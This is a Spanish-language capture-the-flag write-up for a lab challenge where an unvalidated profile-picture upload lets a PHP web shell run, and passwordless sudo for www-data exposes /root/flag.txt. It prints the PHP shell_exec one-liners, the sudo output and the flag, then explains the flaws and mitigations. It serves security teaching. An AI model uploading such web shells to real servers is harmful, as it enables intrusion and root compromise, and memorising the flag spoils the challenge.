## Descripción
A developer has implemented a profile picture upload feature on a website, but the implementation is flawed. Can you exploit the file upload vulnerability and retrieve the flag located in the /root directory?
`http://xebec.cylabacademy.net:35518/`

## Solución
- Accedemos a la página web del reto: `http://xebec.cylabacademy.net:35518/`
- Encontramos un formulario para actualizar la foto de perfil que envía la petición a `upload.php`
- Analizamos el mecanismo de carga y observamos que el backend no implementa ninguna validación de tipo de archivo (extensión o MIME type), guardando los archivos directamente en el directorio público `uploads/`
- Creamos un script en PHP para explorar el entorno y verificar los permisos del usuario `www-data` ejecutando `sudo -l`:
  ```php
  <?php echo shell_exec("sudo -l 2>&1"); ?>
  ```
- Subimos el archivo a través del formulario y accedemos a él en `/uploads/`; la respuesta revela que el usuario `www-data` cuenta con permisos completos de sudo sin contraseña:
  ```text
  User www-data may run the following commands on challenge:
      (ALL) NOPASSWD: ALL
  ```
- Dado que el reto indica que la bandera se encuentra en `/root`, subimos un script PHP para leer `/root/flag.txt` aprovechando los permisos de sudo:
  ```php
  <?php echo shell_exec("sudo cat /root/flag.txt 2>&1"); ?>
  ```
- Al navegar a la ruta del archivo subido en `uploads/`, el servidor ejecuta el código PHP como `www-data`, ejecuta el comando con `sudo` y devuelve la bandera

```text
academy{wh47_c4n_u_d0_wPHP_219a8358}
```

## Notas Adicionales
- **Subida de archivos sin restricciones (Unrestricted File Upload)**: Se produce cuando un sistema permite a usuarios no confiables subir archivos sin validar adecuadamente su extensión, contenido o metadatos. Si la carpeta de destino permite ejecución, esto conduce directamente a Ejecución Remota de Código (RCE).
- **Escalada de Privilegios por Sudo**: La configuración `(ALL) NOPASSWD: ALL` en `/etc/sudoers` para la cuenta de servicio web (`www-data`) es extremadamente peligrosa, ya que cualquier brecha a nivel de aplicación web se convierte instantáneamente en compromiso total del sistema (acceso root).
- **Medidas de mitigación**:
  - Utilizar una lista blanca (*allowlist*) estricta de extensiones permitidas (`.png`, `.jpg`, `.jpeg`).
  - Validar los encabezados de los archivos (*magic bytes*) además del tipo MIME enviado por el cliente.
  - Almacenar los archivos fuera de la raíz web o configurar el servidor web (Apache/Nginx) para desactivar la ejecución de scripts dentro de la carpeta `uploads/`.
